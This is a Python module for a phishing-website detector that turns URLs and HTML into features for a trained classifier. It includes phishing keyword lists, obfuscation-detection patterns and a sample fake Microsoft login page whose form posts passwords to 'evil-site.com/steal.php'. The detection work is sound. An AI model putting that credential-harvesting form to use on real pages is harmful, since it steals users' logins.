import pandas as pd
import numpy as np
from urllib.parse import urlparse, parse_qs
import re
from math import log2
import tldextract


def calculate_entropy(text):
    """Calculate Shannon entropy of a string"""
    if not text:
        return 0

    # Count frequency of each character
    prob = [float(text.count(c)) / len(text) for c in dict.fromkeys(list(text))]

    # Calculate entropy
    entropy = -sum([p * log2(p) for p in prob])
    return entropy


def has_ip_address(url):
    """Check if URL contains an IP address instead of domain name"""
    # IPv4 pattern
    ipv4_pattern = re.compile(r"(\d{1,3}\.){3}\d{1,3}")
    # IPv6 pattern (simplified)
    ipv6_pattern = re.compile(
        r"(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4})"
    )

    return bool(ipv4_pattern.search(url) or ipv6_pattern.search(url))


def count_suspicious_keywords(text):
    """Count suspicious keywords commonly used in phishing"""
    suspicious_words = [
        "verify",
        "account",
        "update",
        "secure",
        "banking",
        "login",
        "signin",
        "ebayisapi",
        "webscr",
        "password",
        "confirm",
        "suspend",
        "alert",
        "authenticate",
        "wallet",
        "credential",
        "security",
        "urgent",
    ]

    text_lower = text.lower()
    count = sum(1 for word in suspicious_words if word in text_lower)
    return count


def has_shortening_service(url):
    """Check if URL uses URL shortening service"""
    shortening_services = [
        "bit.ly",
        "goo.gl",
        "tinyurl",
        "t.co",
        "ow.ly",
        "is.gd",
        "buff.ly",
        "adf.ly",
        "bit.do",
        "short.link",
        "tiny.cc",
    ]

    url_lower = url.lower()
    return int(any(service in url_lower for service in shortening_services))


def get_tld_type(domain):
    """Classify TLD as common, suspicious, or other"""
    common_tlds = [".com", ".org", ".net", ".edu", ".gov", ".co", ".uk", ".de", ".fr"]
    suspicious_tlds = [".tk", ".ml", ".ga", ".cf", ".gq", ".pw", ".cc", ".club", ".xyz"]

    domain_lower = domain.lower()

    if any(domain_lower.endswith(tld) for tld in common_tlds):
        return 1  # Common TLD
    elif any(domain_lower.endswith(tld) for tld in suspicious_tlds):
        return 2  # Suspicious TLD
    else:
        return 0  # Other TLD


def preprocess_single_url(url):
    """
    Preprocess a single URL (same logic as batch preprocessing)

    Parameters:
    -----------
    url : str
        The URL to preprocess

    Returns:
    --------
    tuple: (preprocessed_url, is_valid, error_message)
        - preprocessed_url: cleaned URL string
        - is_valid: boolean indicating if URL is valid
        - error_message: error description if invalid, None otherwise
    """
    # Handle None or non-string input
    if url is None or not isinstance(url, str):
        return None, False, "URL is None or not a string"

    # Strip leading/trailing whitespace
    url = url.strip()

    # Check if empty
    if len(url) == 0:
        return None, False, "URL is empty"

    # Validate URL format
    try:
        result = urlparse(url)
        # Must have scheme (http/https/ftp etc) and netloc (domain)
        if not (result.scheme and result.netloc):
            return None, False, "URL missing scheme or domain"
    except Exception as e:
        return None, False, f"URL parsing failed: {str(e)}"

    return url, True, None


def extract_features_from_single_url(url):
    """
    Extract all features from a single URL (same as batch feature engineering)

    Parameters:
    -----------
    url : str
        The URL to extract features from

    Returns:
    --------
    dict
        Dictionary containing all extracted features
    """
    features = {}

    try:
        # Parse URL
        parsed = urlparse(url)

        # Extract domain components using tldextract
        ext = tldextract.extract(url)
        domain = ext.domain
        subdomain = ext.subdomain
        suffix = ext.suffix
        full_domain = f"{domain}.{suffix}" if suffix else domain

        # ======================
        # 1. URL LENGTH FEATURES
        # ======================
        features["url_length"] = len(url)
        features["domain_length"] = len(full_domain) if full_domain else 0
        features["path_length"] = len(parsed.path)
        features["query_length"] = len(parsed.query)
        features["fragment_length"] = len(parsed.fragment)

        # Count subdirectories in path
        path_parts = [p for p in parsed.path.split("/") if p]
        features["subdirectory_count"] = len(path_parts)

        # ======================
        # 2. PROTOCOL FEATURES
        # ======================
        features["has_https"] = int(parsed.scheme == "https")
        features["has_http"] = int(parsed.scheme == "http")

        # ======================
        # 3. DOMAIN FEATURES
        # ======================
        features["dot_count_in_domain"] = full_domain.count(".")
        features["subdomain_count"] = len(subdomain.split(".")) if subdomain else 0
        features["has_subdomain"] = int(bool(subdomain))
        features["has_ip_address"] = int(has_ip_address(url))
        features["domain_has_numbers"] = int(bool(re.search(r"\d", full_domain)))
        features["suspicious_keywords_in_domain"] = count_suspicious_keywords(
            full_domain
        )

        # ======================
        # 4. SPECIAL CHARACTER FEATURES
        # ======================
        features["at_symbol_count"] = url.count("@")
        features["hyphen_count"] = url.count("-")
        features["underscore_count"] = url.count("_")
        features["question_mark_count"] = url.count("?")
        features["equal_count"] = url.count("=")
        features["ampersand_count"] = url.count("&")
        features["percent_count"] = url.count("%")
        features["double_slash_count"] = (
            url.count("//") - 1
        )  # Subtract the one in http://
        features["digit_count"] = sum(c.isdigit() for c in url)
        features["letter_count"] = sum(c.isalpha() for c in url)
        features["dot_count"] = url.count(".")
        features["slash_count"] = url.count("/")

        # ======================
        # 5. PATH FEATURES
        # ======================
        features["path_depth"] = len(path_parts)

        # File extension
        if path_parts:
            last_part = path_parts[-1]
            if "." in last_part:
                extension = last_part.split(".")[-1].lower()
                features["has_file_extension"] = 1

                # Suspicious extensions
                suspicious_extensions = ["exe", "zip", "rar", "php", "js", "bin", "scr"]
                features["has_suspicious_extension"] = int(
                    extension in suspicious_extensions
                )
            else:
                features["has_file_extension"] = 0
                features["has_suspicious_extension"] = 0
        else:
            features["has_file_extension"] = 0
            features["has_suspicious_extension"] = 0

        # ======================
        # 6. SUSPICIOUS PATTERN FEATURES
        # ======================
        features["has_at_symbol"] = int("@" in url)
        features["has_port"] = int(bool(parsed.port))
        features["has_shortening_service"] = has_shortening_service(url)
        features["suspicious_keywords_in_url"] = count_suspicious_keywords(url)

        # Check for hexadecimal characters (common in encoded URLs)
        hex_pattern = re.compile(r"%[0-9a-fA-F]{2}")
        features["has_hex_encoding"] = int(bool(hex_pattern.search(url)))

        # Prefix/suffix hyphen in domain
        features["prefix_suffix_hyphen"] = int("-" in full_domain)

        # ======================
        # 7. ENTROPY FEATURES
        # ======================
        features["url_entropy"] = calculate_entropy(url)
        features["domain_entropy"] = calculate_entropy(full_domain)
        features["path_entropy"] = calculate_entropy(parsed.path) if parsed.path else 0

        # ======================
        # 8. CHARACTER TYPE RATIOS
        # ======================
        url_len = len(url) if len(url) > 0 else 1  # Avoid division by zero
        features["digit_ratio"] = features["digit_count"] / url_len
        features["letter_ratio"] = features["letter_count"] / url_len

        # Count special characters
        special_char_count = sum(not c.isalnum() for c in url)
        features["special_char_ratio"] = special_char_count / url_len

        # Uppercase to lowercase ratio
        uppercase_count = sum(c.isupper() for c in url)
        lowercase_count = sum(c.islower() for c in url)
        total_letters = uppercase_count + lowercase_count
        features["uppercase_ratio"] = (
            uppercase_count / total_letters if total_letters > 0 else 0
        )

        # ======================
        # 9. LEXICAL FEATURES
        # ======================
        # Split URL into words (by non-alphanumeric characters)
        words = re.findall(r"\b\w+\b", url)
        features["word_count"] = len(words)

        # Average word length
        if words:
            features["avg_word_length"] = np.mean([len(word) for word in words])
            features["longest_word_length"] = max([len(word) for word in words])
        else:
            features["avg_word_length"] = 0
            features["longest_word_length"] = 0

        # TLD classification
        features["tld_type"] = get_tld_type(full_domain)

        # ======================
        # 10. REDIRECTION FEATURES
        # ======================
        # Multiple // in URL (excluding the one in protocol)
        features["multiple_redirects"] = int(url.count("//") > 1)

        # Query parameters count
        if parsed.query:
            query_params = parse_qs(parsed.query)
            features["query_param_count"] = len(query_params)
        else:
            features["query_param_count"] = 0

    except Exception as e:
        print(f"Error processing URL: {url}")
        print(f"Error: {str(e)}")
        # Return features with default values (0)
        return None

    return features


def process_single_url_for_prediction(
    url,
):
    """
    Complete preprocessing and feature engineering pipeline for a single URL.
    This function replicates the entire data pipeline used during training.

    Parameters:
    -----------
    url : str
        The URL to process
    verbose : bool
        If True, print processing information

    Returns:
    --------
    pandas.DataFrame or None
        DataFrame with one row containing the URL and all extracted features,
        or None if the URL is invalid

    Example:
    --------
    >>> url = "https://www.example.com/login"
    >>> result = process_single_url_for_prediction(url)
    >>> print(result.shape)
    (1, 52)  # 1 row with url + 51 features
    """

    # Step 1: Preprocess URL
    preprocessed_url, is_valid, error_msg = preprocess_single_url(url)

    if not is_valid:

        return None

    # Step 2: Extract features

    features = extract_features_from_single_url(preprocessed_url)

    if features is None:
        return None

    # Step 3: Create DataFrame with URL and features
    features["url"] = preprocessed_url

    # Convert to DataFrame
    df_result = pd.DataFrame([features])

    # Reorder columns: url first, then all features (alphabetically for consistency)
    feature_cols = sorted([col for col in df_result.columns if col != "url"])
    df_result = df_result[["url"] + feature_cols]

    return df_result


def predict_from_url(url: str):

    result1 = process_single_url_for_prediction(url)
    if result1 is not None and "url" in result1.columns:
        X = result1.drop(columns=["url"])
    else:
        X = result1
    model = joblib.load(
        "/home/maliha/Programming/dm/Phishing-Website-Classifier/phishing-website-detector-backend/utilities/url/best_model.joblib"
    )
    return {
        "prediction": int(model.predict(X)[0]),
        "phishing_probability": float(model.predict_proba(X)[0][1]),
    }


# =================== ADVANCED WEBCODE FEATURE ENGINEERING ===================
import pandas as pd
import re
from urllib.parse import urlparse
from collections import Counter
import numpy as np
import math
from typing import Dict, Optional
import warnings

warnings.filterwarnings("ignore")


# ============================================================================
# CONSTANTS (Same as training)
# ============================================================================

BRAND_KEYWORDS = {
    "microsoft": ["microsoft.com", "office.com", "outlook.com", "live.com"],
    "google": ["google.com", "gmail.com"],
    "apple": ["apple.com", "icloud.com"],
    "paypal": ["paypal.com"],
    "facebook": ["facebook.com", "fb.com"],
    "amazon": ["amazon.com"],
    "netflix": ["netflix.com"],
    "dropbox": ["dropbox.com"],
    "adobe": ["adobe.com"],
    "linkedin": ["linkedin.com"],
    "twitter": ["twitter.com", "x.com"],
    "instagram": ["instagram.com"],
    "ebay": ["ebay.com"],
    "wells fargo": ["wellsfargo.com"],
    "chase": ["chase.com"],
    "bank of america": ["bankofamerica.com"],
}

FREE_HOSTING_DOMAINS = [
    "000webhost",
    "firebaseapp",
    "formspree",
    "herokuapp",
    "netlify.app",
    "github.io",
    "gitlab.io",
    "weebly.com",
    "wix.com",
    "wordpress.com",
    "blogspot.com",
    "tumblr.com",
    "surge.sh",
    "vercel.app",
    "pages.dev",
    "infinityfree",
    "freehosting",
    "rf.gd",
    "ucoz.",
]

PHISHING_KEYWORDS = [
    "verify",
    "account",
    "suspended",
    "confirm",
    "update",
    "secure",
    "login",
    "password",
    "urgent",
    "immediately",
    "expire",
    "limited",
]


# ============================================================================
# PREPROCESSING FUNCTIONS
# ============================================================================


def remove_surrogates(text: str) -> str:
    """Remove unpaired surrogate characters to prevent encoding errors"""
    try:
        return text.encode("utf-8", errors="surrogatepass").decode(
            "utf-8", errors="ignore"
        )
    except:
        return re.sub(r"[\ud800-\udfff]", "", text)


def remove_html_comments(text: str) -> str:
    """Remove HTML comments using regex (preserves raw HTML structure)"""
    return re.sub(r"<!--.*?-->", "", text, flags=re.DOTALL)


def preprocess_html(html_code: str) -> str:
    """
    Preprocess HTML code (same as training preprocessing).

    Steps:
    1. Remove surrogates (prevents crashes)
    2. Remove HTML comments (pure noise)
    3. Normalize whitespace (reduces noise)
    """
    if pd.isna(html_code) or html_code == "":
        return ""

    try:
        text = str(html_code)
        text = remove_surrogates(text)
        text = remove_html_comments(text)
        text = re.sub(r"\n\s*\n", "\n", text)
        text = re.sub(r"[ \t]+", " ", text)
        text = text.strip()
        return text
    except Exception as e:
        print(f"Error preprocessing: {str(e)}")
        return html_code


# ============================================================================
# UTILITY FUNCTIONS
# ============================================================================


def safe_divide(numerator: float, denominator: float, default: float = 0.0) -> float:
    """Safely divide two numbers, returning default if denominator is 0"""
    return numerator / denominator if denominator != 0 else default


def extract_domain(url: Optional[str]) -> str:
    """Extract domain from URL safely"""
    if not url:
        return ""
    try:
        return urlparse(url).netloc.lower()
    except:
        return ""


def calculate_shannon_entropy(text: str) -> float:
    """Calculate Shannon entropy (measure of randomness/obfuscation)"""
    if not text:
        return 0.0
    counter = Counter(text)
    length = len(text)
    entropy = 0.0
    for count in counter.values():
        probability = count / length
        entropy -= probability * math.log2(probability)
    return entropy


def extract_all_scripts(html: str) -> str:
    """Extract and concatenate all script content"""
    scripts = re.findall(r"<script[^>]*>(.*?)</script>", html, re.DOTALL | re.I)
    return "\n".join(scripts)


def get_text_content(html: str) -> str:
    """Remove all HTML tags to get plain text"""
    return re.sub(r"<[^>]+>", " ", html)


# ============================================================================
# FEATURE EXTRACTION FUNCTIONS (Same as training)
# ============================================================================


def extract_structural_features(html: str) -> Dict[str, float]:
    """Extract DOM structure and complexity features"""
    features = {}
    features["total_tags"] = len(re.findall(r"<[^>]+>", html))
    features["div_count"] = html.count("<div")
    features["script_count"] = html.count("<script")
    features["iframe_count"] = html.count("<iframe")
    features["form_count"] = html.count("<form")
    features["input_count"] = html.count("<input")
    features["a_tag_count"] = html.count("<a ")
    features["img_count"] = html.count("<img")
    features["meta_count"] = html.count("<meta")

    max_depth = 0
    current_depth = 0
    for char in html:
        if char == "<":
            current_depth += 1
            max_depth = max(max_depth, current_depth)
        elif char == ">":
            current_depth = max(0, current_depth - 1)
    features["max_nesting_depth"] = max_depth

    opening_tags = len(re.findall(r"<(?!/)(?!!)[a-zA-Z][^>]*>", html))
    closing_tags = len(re.findall(r"</[a-zA-Z][^>]*>", html))
    features["unclosed_tags"] = abs(opening_tags - closing_tags)
    features["has_doctype"] = 1 if "<!DOCTYPE" in html.upper() else 0
    features["html_length"] = len(html)
    features["html_length_log"] = np.log1p(len(html))

    return features


def extract_form_features(html: str) -> Dict[str, float]:
    """Extract features related to forms and inputs"""
    features = {}
    features["password_field_count"] = len(
        re.findall(r'type\s*=\s*["\']password["\']', html, re.I)
    )
    features["email_field_count"] = len(
        re.findall(r'type\s*=\s*["\']email["\']', html, re.I)
    )
    features["text_input_count"] = len(
        re.findall(r'type\s*=\s*["\']text["\']', html, re.I)
    )
    features["hidden_input_count"] = len(
        re.findall(r'type\s*=\s*["\']hidden["\']', html, re.I)
    )
    features["submit_button_count"] = len(
        re.findall(r'type\s*=\s*["\']submit["\']', html, re.I)
    )

    form_actions = re.findall(r'action\s*=\s*["\']([^"\']+)["\']', html, re.I)
    features["form_has_external_action"] = 0
    features["form_action_suspicious"] = 0
    for action in form_actions:
        if action.startswith("http"):
            features["form_has_external_action"] = 1
        if ".php" in action.lower():
            features["form_action_suspicious"] = 1

    return features


def extract_script_features(html: str) -> Dict[str, float]:
    """Extract JavaScript and obfuscation features"""
    features = {}
    all_scripts = extract_all_scripts(html)
    features["total_script_length"] = len(all_scripts)
    features["has_eval"] = 1 if "eval(" in all_scripts else 0
    features["has_unescape"] = 1 if "unescape(" in all_scripts else 0
    features["has_document_write"] = 1 if "document.write" in all_scripts else 0
    features["has_settimeout"] = 1 if "setTimeout" in all_scripts else 0
    features["has_setinterval"] = 1 if "setInterval" in all_scripts else 0
    features["has_unicode_escape"] = 1 if re.search(r"\\u[0-9a-fA-F]{4}", html) else 0
    features["has_hex_escape"] = 1 if re.search(r"\\x[0-9a-fA-F]{2}", html) else 0
    features["has_base64"] = 1 if re.search(r"atob\s*\(", all_scripts) else 0
    features["has_packed_js"] = (
        1 if re.search(r"eval\s*\(\s*function\s*\(", all_scripts) else 0
    )
    features["has_charcodeat"] = 1 if "charCodeAt" in all_scripts else 0
    features["has_fromcharcode"] = 1 if "fromCharCode" in all_scripts else 0
    features["unicode_escape_count"] = len(re.findall(r"\\u[0-9a-fA-F]{4}", html))
    features["url_encoding_count"] = len(re.findall(r"%[0-9a-fA-F]{2}", html))
    features["js_entropy"] = (
        calculate_shannon_entropy(all_scripts) if all_scripts else 0.0
    )
    features["high_entropy_js"] = 1 if features["js_entropy"] > 5.0 else 0
    return features


def extract_url_features(html: str, page_url: Optional[str] = None) -> Dict[str, float]:
    """Extract features from URLs and links"""
    features = {}
    hrefs = re.findall(r'href\s*=\s*["\']([^"\']+)["\']', html, re.I)
    features["total_links"] = len(hrefs)
    features["external_links"] = 0
    features["suspicious_tld_count"] = 0
    features["ip_in_url"] = 0

    suspicious_tlds = [".tk", ".ml", ".ga", ".cf", ".gq", ".info", ".xyz"]
    for href in hrefs:
        if href.startswith("http"):
            features["external_links"] += 1
            if any(tld in href.lower() for tld in suspicious_tlds):
                features["suspicious_tld_count"] += 1
            if re.search(r"https?://\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", href):
                features["ip_in_url"] = 1

    features["external_resources"] = len(re.findall(r'src\s*=\s*["\']http', html, re.I))

    link_patterns = re.findall(
        r'<a[^>]+href\s*=\s*["\']([^"\']+)["\'][^>]*>([^<]*)</a>', html, re.I
    )
    features["url_text_mismatch"] = 0
    for url, text in link_patterns:
        text_clean = text.strip().lower()
        if re.search(r"[a-z0-9-]+\.(com|net|org)", text_clean) and url.startswith(
            "http"
        ):
            if text_clean not in url.lower():
                features["url_text_mismatch"] = 1
                break

    return features


def extract_visual_features(html: str) -> Dict[str, float]:
    """Analyze visual layout patterns"""
    features = {}
    img_tags = re.findall(r"<img[^>]*>", html, re.I)
    total_img_area = 0
    for img in img_tags:
        width = re.search(r'width\s*=\s*["\']?(\d+)', img, re.I)
        height = re.search(r'height\s*=\s*["\']?(\d+)', img, re.I)
        if width and height:
            total_img_area += int(width.group(1)) * int(height.group(1))

    text_length = len(get_text_content(html).strip())
    features["total_image_area"] = total_img_area
    features["image_to_text_ratio"] = safe_divide(total_img_area, text_length)
    features["high_image_to_text"] = 1 if features["image_to_text_ratio"] > 100 else 0

    z_indices = [int(z) for z in re.findall(r"z-index\s*:\s*(\d+)", html, re.I)]
    features["max_z_index"] = max(z_indices) if z_indices else 0
    features["z_index_range"] = (
        max(z_indices) - min(z_indices) if len(z_indices) > 1 else 0
    )
    features["high_z_index_elements"] = sum(1 for z in z_indices if z > 100)
    features["absolute_position_count"] = len(
        re.findall(r"position\s*:\s*absolute", html, re.I)
    )
    features["overlay_pattern"] = (
        1
        if (features["absolute_position_count"] > 3 and features["max_z_index"] > 10)
        else 0
    )
    features["font_size_zero"] = len(re.findall(r"font-size\s*:\s*0", html, re.I))
    features["opacity_zero"] = len(re.findall(r"opacity\s*:\s*0", html, re.I))
    features["negative_position"] = len(
        re.findall(r"(left|top)\s*:\s*-\d{3,}px", html, re.I)
    )
    features["display_none"] = len(re.findall(r"display\s*:\s*none", html, re.I))
    features["hidden_text_techniques"] = (
        features["font_size_zero"]
        + features["opacity_zero"]
        + features["negative_position"]
    )

    return features


def extract_behavioral_features(html: str) -> Dict[str, float]:
    """Detect suspicious behavioral patterns"""
    features = {}
    all_scripts = extract_all_scripts(html)
    features["delayed_password_reveal"] = (
        1
        if re.search(r"setTimeout.*type.*password", all_scripts, re.I | re.DOTALL)
        else 0
    )

    dom_patterns = [
        r"setTimeout.*innerHTML",
        r"setTimeout.*createElement",
        r"setTimeout.*appendChild",
        r"setInterval.*style",
    ]
    features["delayed_dom_modification"] = sum(
        1 for p in dom_patterns if re.search(p, all_scripts, re.I | re.DOTALL)
    )

    security_patterns = [
        r"keydown.*preventDefault",
        r"keypress.*preventDefault",
        r"contextmenu.*preventDefault",
        r"F12.*preventDefault",
        r"inspect.*preventDefault",
        r"Ctrl.*U.*preventDefault",
    ]
    features["blocks_security_hotkeys"] = sum(
        1 for p in security_patterns if re.search(p, all_scripts, re.I)
    )

    return features


def extract_identity_features(
    html: str, page_url: Optional[str] = None
) -> Dict[str, float]:
    """Check for identity and brand mismatches"""
    features = {}
    domain = extract_domain(page_url)
    text_content = get_text_content(html).lower()

    mentioned_brands = [
        brand for brand in BRAND_KEYWORDS.keys() if brand in text_content
    ]
    features["brand_mention_count"] = len(mentioned_brands)
    features["domain_brand_mismatch"] = 0
    if domain and mentioned_brands:
        domain_matches = any(
            any(official in domain for official in BRAND_KEYWORDS[brand])
            for brand in mentioned_brands
        )
        features["domain_brand_mismatch"] = 0 if domain_matches else 1

    form_actions = re.findall(r'action\s*=\s*["\']([^"\']+)["\']', html, re.I)
    features["form_action_to_free_host"] = 0
    features["form_action_different_domain"] = 0
    for action in form_actions:
        if any(free_host in action.lower() for free_host in FREE_HOSTING_DOMAINS):
            features["form_action_to_free_host"] = 1
        if action.startswith("http") and domain:
            action_domain = extract_domain(action)
            if action_domain and action_domain != domain:
                features["form_action_different_domain"] = 1

    features["has_favicon"] = (
        1 if re.search(r'rel\s*=\s*["\'][^"\']*icon[^"\']*["\']', html, re.I) else 0
    )
    favicon_urls = re.findall(
        r'rel\s*=\s*["\'][^"\']*icon[^"\']*["\'][^>]*href\s*=\s*["\']([^"\']+)["\']',
        html,
        re.I,
    )
    features["favicon_external"] = 0
    if favicon_urls and domain:
        features["favicon_external"] = (
            1
            if any(f.startswith("http") and domain not in f for f in favicon_urls)
            else 0
        )

    return features


def extract_semantic_features(
    html: str, page_url: Optional[str] = None
) -> Dict[str, float]:
    """Analyze semantic relationships in the DOM"""
    features = {}
    text_with_brands = [
        brand for brand in BRAND_KEYWORDS.keys() if brand in html.lower()
    ]
    features["brands_near_password_field"] = 0

    if text_with_brands:
        password_positions = [
            m.start() for m in re.finditer(r'type\s*=\s*["\']password["\']', html, re.I)
        ]
        for brand in text_with_brands:
            brand_positions = [m.start() for m in re.finditer(brand, html, re.I)]
            for p_pos in password_positions:
                for b_pos in brand_positions:
                    if abs(p_pos - b_pos) < 500:
                        features["brands_near_password_field"] = 1
                        break

    title_match = re.search(r"<title[^>]*>([^<]+)</title>", html, re.I)
    features["title_has_brand"] = 0
    features["brand_password_distance"] = 0
    features["brand_password_far"] = 0
    if title_match:
        title_text = title_match.group(1).lower()
        title_has_brand = any(brand in title_text for brand in BRAND_KEYWORDS.keys())
        features["title_has_brand"] = 1 if title_has_brand else 0
        if title_has_brand and re.search(r'type\s*=\s*["\']password["\']', html, re.I):
            title_pos = title_match.start()
            password_positions = [
                m.start()
                for m in re.finditer(r'type\s*=\s*["\']password["\']', html, re.I)
            ]
            min_distance = min(abs(title_pos - p_pos) for p_pos in password_positions)
            features["brand_password_distance"] = min_distance
            features["brand_password_far"] = 1 if min_distance > 2000 else 0

    domain = extract_domain(page_url)
    all_resources = []
    all_resources.extend(re.findall(r'src\s*=\s*["\']([^"\']+)["\']', html, re.I))
    all_resources.extend(
        re.findall(r'href\s*=\s*["\']([^"\']+\.css[^"\']*)["\']', html, re.I)
    )
    all_resources.extend(
        re.findall(r'<script[^>]+src\s*=\s*["\']([^"\']+)["\']', html, re.I)
    )
    external_resources = [r for r in all_resources if r.startswith("http")]

    features["total_resources"] = len(all_resources)
    features["external_resources"] = len(external_resources)
    features["official_brand_resources"] = 0
    features["ratio_official_assets"] = 0
    features["hotlinking_official_assets"] = 0

    if external_resources:
        for resource in external_resources:
            resource_lower = resource.lower()
            for brand, official_domains in BRAND_KEYWORDS.items():
                if any(official in resource_lower for official in official_domains):
                    features["official_brand_resources"] += 1
                    break
        features["ratio_official_assets"] = safe_divide(
            features["official_brand_resources"], len(external_resources)
        )
        if features["ratio_official_assets"] > 0.5 and domain:
            is_official = any(
                any(official in domain for official in domains)
                for domains in BRAND_KEYWORDS.values()
            )
            features["hotlinking_official_assets"] = 0 if is_official else 1

    return features


def extract_content_features(html: str) -> Dict[str, float]:
    """Extract features from visible text and keywords"""
    features = {}
    text = get_text_content(html).lower()
    features["text_length"] = len(text)
    features["word_count"] = len(text.split())
    features["phishing_keyword_count"] = sum(
        1 for keyword in PHISHING_KEYWORDS if keyword in text
    )
    features["exclamation_count"] = text.count("!")
    features["question_count"] = text.count("?")
    features["special_char_ratio"] = safe_divide(
        len(re.findall(r"[^a-zA-Z0-9\s]", text)), len(text)
    )
    return features


# ============================================================================
# MAIN PIPELINE FUNCTION
# ============================================================================


def process_webpage_for_prediction(
    webpage_code: str, url: Optional[str] = None
) -> pd.DataFrame:
    """
    Complete pipeline: Preprocess HTML and extract all 79 features.
    Returns a DataFrame with one row ready for model prediction.

    Args:
        webpage_code: Raw HTML code as string
        url: Optional URL of the webpage

    Returns:
        DataFrame with one row containing all 79 features in correct order
    """
    try:
        # Step 1: Preprocess HTML (same as training)
        preprocessed_html = preprocess_html(webpage_code)

        # Step 2: Extract all features
        features = {}
        features.update(extract_structural_features(preprocessed_html))
        features.update(extract_form_features(preprocessed_html))
        features.update(extract_script_features(preprocessed_html))
        features.update(extract_url_features(preprocessed_html, url))
        features.update(extract_visual_features(preprocessed_html))
        features.update(extract_behavioral_features(preprocessed_html))
        features.update(extract_identity_features(preprocessed_html, url))
        features.update(extract_semantic_features(preprocessed_html, url))
        features.update(extract_content_features(preprocessed_html))

        # Step 3: Convert to DataFrame
        df = pd.DataFrame([features])

        return df

    except Exception as e:
        print(f"Error in pipeline: {str(e)}")
        # Return empty DataFrame with all feature columns as 0
        empty_features = {f: 0 for f in get_feature_names()}
        return pd.DataFrame([empty_features])


def get_feature_names() -> list:
    """Return list of all 79 feature names in the correct order (same as training)"""
    return [
        "total_tags",
        "div_count",
        "script_count",
        "iframe_count",
        "form_count",
        "input_count",
        "a_tag_count",
        "img_count",
        "meta_count",
        "max_nesting_depth",
        "unclosed_tags",
        "has_doctype",
        "html_length",
        "html_length_log",
        "password_field_count",
        "email_field_count",
        "text_input_count",
        "hidden_input_count",
        "submit_button_count",
        "form_has_external_action",
        "form_action_suspicious",
        "total_script_length",
        "has_eval",
        "has_unescape",
        "has_document_write",
        "has_settimeout",
        "has_setinterval",
        "has_unicode_escape",
        "has_hex_escape",
        "has_base64",
        "has_packed_js",
        "has_charcodeat",
        "has_fromcharcode",
        "unicode_escape_count",
        "url_encoding_count",
        "js_entropy",
        "high_entropy_js",
        "total_links",
        "external_links",
        "suspicious_tld_count",
        "ip_in_url",
        "external_resources",
        "url_text_mismatch",
        "total_image_area",
        "image_to_text_ratio",
        "high_image_to_text",
        "max_z_index",
        "z_index_range",
        "high_z_index_elements",
        "absolute_position_count",
        "overlay_pattern",
        "font_size_zero",
        "opacity_zero",
        "negative_position",
        "display_none",
        "hidden_text_techniques",
        "delayed_password_reveal",
        "delayed_dom_modification",
        "blocks_security_hotkeys",
        "brand_mention_count",
        "domain_brand_mismatch",
        "form_action_to_free_host",
        "form_action_different_domain",
        "has_favicon",
        "favicon_external",
        "brands_near_password_field",
        "title_has_brand",
        "brand_password_distance",
        "brand_password_far",
        "total_resources",
        "external_resources",
        "official_brand_resources",
        "ratio_official_assets",
        "hotlinking_official_assets",
        "text_length",
        "word_count",
        "phishing_keyword_count",
        "exclamation_count",
        "question_count",
        "special_char_ratio",
    ]


# ============================================================================
# EXAMPLE USAGE
# ============================================================================

if __name__ == "__main__":
    # Example: Process a webpage
    sample_html = """
    <!DOCTYPE html>
    <html>
    <head><title>Microsoft Login</title></head>
    <body>
        <form action="http://evil-site.com/steal.php" method="post">
            <input type="text" name="username">
            <input type="password" name="pass">
            <input type="submit">
        </form>
        <script>
            setTimeout(function() {
                document.getElementsByTagName('input')[1].type = "password"
            }, 1000);
        </script>
    </body>
    </html>
    """


import joblib


# ============================================================
# ================= PREDICTION ===============================
# ============================================================


def predict_from_webcode(webcode: str, page_url: Optional[str] = None):
    X = process_webpage_for_prediction(webcode, page_url)
    # Load your trained model
    model = joblib.load(
        "/home/maliha/Programming/dm/Phishing-Website-Classifier/training/utilities/webcode/best_phishing_model_webcode.pkl"
    )
    scaler = joblib.load(
        "/home/maliha/Programming/dm/Phishing-Website-Classifier/training/utilities/webcode/feature_scaler_webcode.pkl"
    )  # if you used scaling
    X_scaled = scaler.transform(X)

    return {
        "prediction": int(model.predict(X_scaled)[0]),
        "phishing_probability": float(model.predict_proba(X_scaled)[0][1]),
    }
